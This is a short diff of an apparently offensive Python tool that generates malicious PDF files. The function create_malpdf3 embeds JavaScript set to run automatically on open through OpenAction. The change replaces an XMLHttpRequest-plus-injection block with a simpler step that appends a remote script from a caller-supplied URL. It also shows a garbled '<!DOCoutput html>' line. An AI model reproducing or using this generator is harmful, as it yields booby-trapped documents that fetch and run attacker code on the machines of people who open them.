@@ -49,24 +49,13 @@ def create_malpdf3(filename, url):
         <</Pages 1 0 R /OpenAction 2 0 R>>
         2 0 obj
         <</S /JavaScript /JS (
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "{url}", true);
-        xhr.onreadystatechange = function() {{
-            if (xhr.readyState == 4 && xhr.status == 200) {{}}
-            else if (xhr.readyState == 4) {{}}
-        }};
-        xhr.send();
-        var script = "{url}";
-        var element = document.createElement('script'); 
-        element.src = script; 
-        document.body.appendChild(element);
+            var script = document.createElement("script");
+            script.src = "{url}";
+            document.body.appendChild(script);
         )>> 
         trailer
         <</Root 1 0 R>>''')
         print("[+] Created malpdf3.pdf")
-
-
-
                 
 def create_malhtml(filename):
     html_content = '''<!DOCoutput html>
